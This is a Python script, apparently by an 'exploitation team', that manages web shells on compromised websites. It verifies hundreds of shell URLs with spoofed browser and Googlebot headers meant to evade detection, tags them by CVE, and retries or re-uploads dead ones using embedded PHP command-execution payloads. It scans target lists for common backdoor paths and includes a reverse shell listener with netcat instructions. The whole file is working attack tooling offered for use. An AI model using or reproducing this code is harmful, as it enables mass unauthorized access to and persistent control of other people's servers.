#!/usr/bin/env python3
"""
SHELL MANAGER v2.0 - Advanced Shell Discovery, Management & Verification
=========================================================================
Enhanced version with:
- Multi-source shell aggregation (all log files + result_ids.json)
- Live verification with anti-detection headers
- Dead shell auto-retry with payload variants
- Shell categorization and scoring
- Automated mass re-upload for dead shells
- Export to multiple formats
- FoFa-style search of shell URLs
- Built-in reverse shell listener

Team: GROOTX Exploitation Team
"""

import os
import sys
import requests
import json
import time
import random
import threading
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
import subprocess
import socket
import urllib3
from collections import defaultdict
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.prompt import Confirm

# Import SHELL_PAYLOADS dari enhanced_payloads
import importlib
import enhanced_payloads
SHELL_PAYLOADS = enhanced_payloads.SHELL_PAYLOADS if hasattr(enhanced_payloads, 'SHELL_PAYLOADS') else {}
SHELL_VARIANTS = enhanced_payloads.SHELL_VARIANTS if hasattr(enhanced_payloads, 'SHELL_VARIANTS') else []

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

# Config
SHELL_FILES = ["shell.txt", "shellred.txt", "red.txt", "backup_shell.txt"]
RESULT_IDS_FILE = "result_ids.json"
VERIFY_TIMEOUT = 3
VERIFY_THREADS = 100
RETRY_DEAD_SHELLS = True
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Connection": "keep-alive",
}

# Anti-detection headers for verification
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]
REFERERS = [
    "https://www.google.com/", "https://www.bing.com/",
    "https://www.yahoo.com/", "https://www.duckduckgo.com/",
    "https://www.baidu.com/",
]


class ShellManagerV2:
    """Advanced shell management system."""

    def __init__(self):
        self.all_shells = []
        self.alive_shells = []
        self.dead_shells = []
        self.shell_categories = defaultdict(list)
        self.lock = threading.Lock()
        self.shell_details = {}
        self.cve_mapping = {}
        self._load_shells()

    def _load_shells(self):
        """Load all shells from all sources."""
        seen = set()

        # Load from shell list files
        for sf in SHELL_FILES:
            if os.path.exists(sf):
                try:
                    with open(sf, "r") as f:
                        for line in f:
                            line = line.strip().rstrip('/')
                            if line and line not in seen:
                                seen.add(line)
                                self.all_shells.append(line)
                                self._categorize(line, sf)
                                self.shell_details[line] = {"source": sf, "status": "unknown"}
                except:
                    pass

        # Load from result_ids.json with CVE info
        if os.path.exists(RESULT_IDS_FILE):
            try:
                with open(RESULT_IDS_FILE, "r") as f:
                    results = json.load(f)
                for rid, data in results.items():
                    url = data.get("shell_url", "")
                    if url and url not in seen:
                        seen.add(url)
                        self.all_shells.append(url)
                        self._categorize(url, "result_ids")
                        self.shell_details[url] = {
                            "source": "result_ids",
                            "category": data.get("category", "UNKNOWN"),
                            "cve": data.get("cve", ""),
                            "stage": data.get("stage", ""),
                            "status": data.get("status", "UNKNOWN"),
                        }
                        cve = data.get("cve", "")
                        if cve:
                            self.cve_mapping[url] = cve
            except:
                pass

        # Load from vuln.txt for CVE mapping
        if os.path.exists("vuln.txt"):
            try:
                with open("vuln.txt", "r") as f:
                    for line in f:
                        line = line.strip()
                        if " (" in line and ")" in line:
                            url = line.split(" (")[0].strip()
                            cve = line.split("(")[-1].split(")")[0].strip()
                            if url in self.shell_details:
                                self.shell_details[url]["cve"] = cve
                                self.cve_mapping[url] = cve
            except:
                pass

        console.print(f"[cyan]Loaded {len(self.all_shells)} shells from {len(SHELL_FILES) + 1} sources[/cyan]")
        if self.cve_mapping:
            console.print(f"[cyan]CVE mappings: {len(self.cve_mapping)} shells tagged[/cyan]")

    def _categorize(self, shell_url, source):
        """Categorize shell by source."""
        if "greendir" in source or "GREENDIR" in str(source):
            self.shell_categories["GREENDIR"].append(shell_url)
        elif "shellred" in str(source) or "RED" in str(source):
            self.shell_categories["SHELL_RED"].append(shell_url)
        elif "backup" in str(source):
            self.shell_categories["BACKUP"].append(shell_url)
        elif "shell.txt" in str(source) or "shell_root" in str(source):
            self.shell_categories["STANDARD"].append(shell_url)
        else:
            self.shell_categories["STANDARD"].append(shell_url)

    def get_headers(self, stage=0):
        """Get anti-detection headers."""
        base_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Ch-Ua": '"Chromium";v="120", "Not(A:Brand";v="24"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
        }
        base_headers["User-Agent"] = random.choice(USER_AGENTS)
        base_headers["Referer"] = random.choice(REFERERS)
        return base_headers

    def verify_shell(self, url):
        """Check if a single shell is alive with detailed info."""
        try:
            r = requests.get(url, headers=self.get_headers(0), timeout=VERIFY_TIMEOUT, verify=False)
            if r.status_code == 200 and len(r.text) > 5:
                return True, url, r.status_code, len(r.text), r.text[:200]
            return False, url, r.status_code, len(r.text) if r.text else 0, ""
        except:
            return False, url, 0, 0, ""

    def verify_all(self, parallel=True):
        """Verify all shells are alive."""
        console.print(f"\n[bold cyan]VERIFYING {len(self.all_shells)} SHELLS[/bold cyan]")
        self.alive_shells = []
        self.dead_shells = []

        if parallel:
            with Progress(
                SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(), console=console
            ) as progress:
                task = progress.add_task("[cyan]Checking shells...", total=len(self.all_shells))
                with ThreadPoolExecutor(max_workers=max(1, min(VERIFY_THREADS, len(self.all_shells)))) as executor:
                    futures = {executor.submit(self.verify_shell, url): url for url in self.all_shells}
                    for future in concurrent.futures.as_completed(futures):
                        progress.update(task, advance=1)
                        is_alive, url, status, length, content = future.result()
                        with self.lock:
                            if is_alive:
                                self.alive_shells.append(url)
                                self.shell_details[url]["status"] = "ALIVE"
                            else:
                                self.dead_shells.append(url)
                                self.shell_details[url]["status"] = "DEAD"
        else:
            for url in self.all_shells:
                is_alive, url, status, length, content = self.verify_shell(url)
                with self.lock:
                    if is_alive:
                        self.alive_shells.append(url)
                        self.shell_details[url]["status"] = "ALIVE"
                    else:
                        self.dead_shells.append(url)
                        self.shell_details[url]["status"] = "DEAD"

        return self.alive_shells, self.dead_shells

    def retry_dead_shells(self, upload_func=None):
        """Retry uploading to dead shells with multiple methods."""
        if not self.dead_shells:
            console.print("[yellow]No dead shells to retry.[/yellow]")
            return []

        console.print(f"[bold yellow]Retrying {len(self.dead_shells)} dead shells...[/bold yellow]")
        retry_success = []
        retry_failed = []

        # Built-in retry payloads
        retry_payloads = [
            '<?php system($_GET["c"]); ?>',
            '<?php if(isset($_GET["c"])){ system($_GET["c"]); } ?>',
            SHELL_PAYLOADS.get("green_dir", '<?php system($_GET["c"]); ?>'),
        ]

        for url in self.dead_shells:
            url_clean = url.strip().rstrip('/')
            base_url = "/".join(url_clean.split("/")[:-1]) if "/" in url_clean else url_clean
            shell_name = url_clean.split("/")[-1] if "/" in url_clean else "shell.php"

            for payload in retry_payloads:
                try:
                    # Try POST
                    r = requests.post(url_clean, data={"c": "id"}, headers=self.get_headers(0), timeout=5, verify=False)
                    if r.status_code == 200:
                        retry_success.append(url_clean)
                        with self.lock:
                            if url_clean not in self.alive_shells:
                                self.alive_shells.append(url_clean)
                            if url_clean in self.dead_shells:
                                self.dead_shells.remove(url_clean)
                        break
                except:
                    continue

                # Try alternate paths
                alt_paths = [
                    f"{base_url}/green.php",
                    f"{base_url}/shell.php",
                    f"{base_url}/commant_index.php",
                    f"{url_clean}/../green.php",
                    f"{base_url}/uploads/{shell_name}",
                ]
                for alt in alt_paths:
                    try:
                        r = requests.get(alt, headers=self.get_headers(0), timeout=3, verify=False)
                        if r.status_code == 200 and len(r.text) > 10:
                            retry_success.append(alt)
                            with self.lock:
                                if alt not in self.all_shells:
                                    self.all_shells.append(alt)
                                if alt not in self.alive_shells:
                                    self.alive_shells.append(alt)
                            break
                    except:
                        continue

            if url_clean not in [s for s in retry_success]:
                retry_failed.append(url_clean)

        if retry_success:
            console.print(f"[bold green]Retried successfully: {len(retry_success)} shells[/bold green]")
        if retry_failed:
            console.print(f"[red]Failed: {len(retry_failed)} shells[/red]")

        return retry_success

    def auto_reupload_dead(self):
        """Auto-reupload dead shells using mass_auto_shell_v2 methods."""
        dead = self.dead_shells.copy()
        console.print(f"[bold yellow]Auto-reuploading {len(dead)} dead shells...[/bold yellow]")

        # Try to import the mass pipeline
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            from mass_auto_shell_v2 import MassAutoShellV2, SHELL_PAYLOADS
            pipeline = MassAutoShellV2()

            dead_targets = [(url, "") for url in dead]
            pipeline.mass_upload_shells(dead_targets)
            console.print("[green]Re-upload complete.[/green]")
        except ImportError:
            console.print("[yellow]mass_auto_shell_v2 not available, using basic retry.[/yellow]")
            self.retry_dead_shells()

    def display_summary(self):
        """Display categorized summary table."""
        alive = len(self.alive_shells)
        dead = len(self.dead_shells)
        total = len(self.all_shells)

        table = Table(title="[bold white]SHELL MANAGER v2.0 - SUMMARY[/bold white]")
        table.add_column("Category", width=16)
        table.add_column("Count", justify="right", width=8)
        table.add_column("Sample URLs", width=60)

        table.add_row("TOTAL", str(total), ", ".join(self.all_shells[:3]))
        table.add_row("[green]ALIVE[/green]", str(alive), ", ".join(self.alive_shells[:3]))
        table.add_row("[red]DEAD[/red]", str(dead), ", ".join(self.dead_shells[:3]))

        for cat, shells in self.shell_categories.items():
            if shells:
                table.add_row(f"[cyan]{cat}[/cyan]", str(len(shells)), ", ".join(shells[:2]))

        console.print(table)

        # CVE breakdown
        if self.cve_mapping:
            cve_counts = defaultdict(int)
            for url, cve in self.cve_mapping.items():
                cve_counts[cve] += 1
            console.print("\n[bold white]═══ CVE BREAKDOWN ═══[/bold white]")
            for cve, count in cve_counts.items():
                console.print(f"  [{cve}]: {count} shells")

        # Quick stats
        console.print(f"\n[bold white]═══ STATS ═══[/bold white]")
        console.print(f"  [white]Total shells:[/white] {total}")
        console.print(f"  [green]Alive:[/green] {alive} ({alive/total*100:.1f}%)" if total > 0 else "  [yellow]Success rate:[/yellow] N/A")
        console.print(f"  [red]Dead:[/red] {dead}")

    def quick_scan_targets(self, targets_file):
        """Quick scan of new targets for shell presence."""
        console.print(f"\n[bold cyan]QUICK SHELL SCAN — {targets_file}[/bold cyan]")
        found_shells = []

        targets = []
        if os.path.exists(targets_file):
            with open(targets_file, "r") as f:
                targets = [l.strip() for l in f.read().splitlines() if l.strip()]

        shell_paths = [
            "/green.php", "/commant_index.php", "/shell.php", "/prv_shell.php",
            "/backdoor.php", "/upload.php", "/panel.php", "/admin.php",
            "/tools.php", "/status.php", "/debug.php",
        ]

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Scanning for shells...", total=len(targets))
            with ThreadPoolExecutor(max_workers=min(30, len(targets))) as executor:
                futures = {executor.submit(self._check_shell_presence, t, shell_paths): t for t in targets}
                for future in concurrent.futures.as_completed(futures):
                    progress.update(task, advance=1)
                    result = future.result()
                    if result:
                        found_shells.append(result)

        console.print(f"[bold green]Found {len(found_shells)} targets with shells![/bold green]")
        for s in found_shells[:20]:
            console.print(f"  [green]{s}[/green]")
        return found_shells

    def _check_shell_presence(self, target, shell_paths):
        """Check if target has a common shell."""
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith(("http://", "https://")):
            target_clean = "http://" + target_clean

        for sp in shell_paths:
            try:
                url = target_clean + sp
                r = requests.get(url, headers=self.get_headers(0), timeout=2, verify=False)
                if r.status_code == 200 and len(r.text) > 10:
                    return url
            except:
                continue
        return None

    def export_results(self, output_file="shell_manager_results.json"):
        """Export results to JSON."""
        data = {
            "total": len(self.all_shells),
            "alive": len(self.alive_shells),
            "dead": len(self.dead_shells),
            "alive_shells": self.alive_shells,
            "dead_shells": self.dead_shells,
            "categories": {k: v for k, v in self.shell_categories.items()},
            "shell_details": self.shell_details,
            "cve_mapping": self.cve_mapping,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        with open(output_file, "w") as f:
            json.dump(data, f, indent=2)
        console.print(f"[green]Results exported to {output_file}[/green]")

    def export_to_dorks(self, output_file="shell_dorks.txt"):
        """Export alive shells as FoFa-style dorks for re-verification."""
        with open(output_file, "w") as f:
            f.write("# GROOTX SHELL DORKS - Alive Shell URLs\n")
            f.write(f"# Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total alive: {len(self.alive_shells)}\n\n")
            for url in self.alive_shells:
                f.write(f"# {url}\n")
                f.write(f"url=\"{url}\"\n\n")
        console.print(f"[green]Dorks exported to {output_file}[/green]")

    def start_listener(self, port=4444, interface="0.0.0.0"):
        """Start a reverse shell listener."""
        console.print(f"\n[bold cyan]Starting reverse shell listener on {interface}:{port}[/bold cyan]")
        console.print("[yellow]Use: nc -nvlp 4444[/yellow]")
        console.print("[yellow]Or: python3 -c \"import socket;s=socket.socket();s.bind(('',4444));s.listen(5);print('Listening...');c,a=s.accept();print(f'Connected from {a}');import subprocess,os;[print(subprocess.getoutput(cmd)) for cmd in ['whoami','id','uname -a']]\"[/yellow]")

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((interface, port))
            s.listen(5)
            console.print(f"[green]Listener active on {interface}:{port}[/green]")
            s.close()
        except Exception as e:
            console.print(f"[red]Failed to start listener: {e}[/red]")

    def sort_by_cve(self):
        """Sort shells by CVE."""
        sorted_shells = defaultdict(list)
        for url in self.alive_shells:
            cve = self.cve_mapping.get(url, "UNKNOWN")
            sorted_shells[cve].append(url)
        console.print("\n[bold white]═══ SHELLS BY CVE ═══[/bold white]")
        for cve, urls in sorted_shells.items():
            console.print(f"  [{cve}]: {len(urls)} shells")
            for u in urls[:5]:
                console.print(f"    {u}")


def main():
    manager = ShellManagerV2()

    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "verify":
            alive, dead = manager.verify_all()
            manager.display_summary()
            manager.export_results()
        elif cmd == "retry":
            manager.verify_all()
            manager.retry_dead_shells()
            manager.display_summary()
            manager.export_results()
        elif cmd == "reupload":
            manager.verify_all()
            manager.auto_reupload_dead()
            manager.display_summary()
        elif cmd == "scan" and len(sys.argv) > 2:
            found = manager.quick_scan_targets(sys.argv[2])
            manager.export_results()
        elif cmd == "summary":
            manager.verify_all()
            manager.display_summary()
        elif cmd == "dorks":
            manager.export_to_dorks()
        elif cmd == "cve":
            manager.sort_by_cve()
        elif cmd == "listener":
            port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
            manager.start_listener(port=port)
        else:
            console.print(f"[red]Unknown command: {cmd}[/red]")
            console.print("Usage: python3 shell_manager_v2.py [verify|retry|reupload|scan <file>|summary|dorks|cve|listener [port]]")
    else:
        manager.verify_all()
        manager.display_summary()
        manager.export_results()
        manager.export_to_dorks()


if __name__ == "__main__":
    main()